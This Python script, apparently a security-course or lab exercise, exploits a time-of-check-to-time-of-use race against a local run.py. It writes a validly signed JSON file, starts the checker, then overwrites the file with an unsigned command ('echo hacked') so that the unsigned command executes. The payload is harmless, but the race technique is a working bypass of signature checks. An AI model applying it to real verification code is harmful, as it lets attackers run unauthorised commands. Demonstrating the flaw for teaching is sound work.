import json
import os
import time
import multiprocessing as mltp


def execute_run():
    #run run.py with out malicious file
    os.system("python3 run.py cracked.json")

#time of check to time of use - TOCTTOU
def injection_through_json():

    #open the legit json file with the correct signature for
    #'echo cool'
    js_file = open("example.json", "r")
    
    #read the legit content so we can write it later to our malicious file
    legit_input = js_file.read()
    js_file.close()
   
    
    #our malicious file
    malicious_file = open("cracked.json", "w")
    
    #write the legit content to our malicious file and make sure 
    #the content is written (flush), it will help us pass the checking
    #mechanism, well about the use... we will see :)
    malicious_file.write(legit_input)
    malicious_file.flush()
    malicious_file.close()
    
    #make another process that will run run.py with our malicous file
    #and put our process to sleep so we will be sure run.py read our
    #legit content  
    p = mltp.Process(target = execute_run)

    p.start()
    
    time.sleep(2.5)
    
    #open again our file and overwrite it's content with our malicious content
    malicious_file = open("cracked.json", "w")   
    exploit_input = json.dumps({'command': 'echo hacked', 'signature': '1'})

    #overwrite cracked.json with our malicious content and make sure
    #it's written (flush), now run.py check the legit content but will
    #execute our malicious content 
    malicious_file.write(exploit_input)
    malicious_file.flush()
    malicious_file.close()
    
    #wait for run.py to finish
    p.join()

def main(argv):
    #the function that use TOCTTOU vulnerability and make run.py print 
    #"hacked"
    injection_through_json()
    

if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
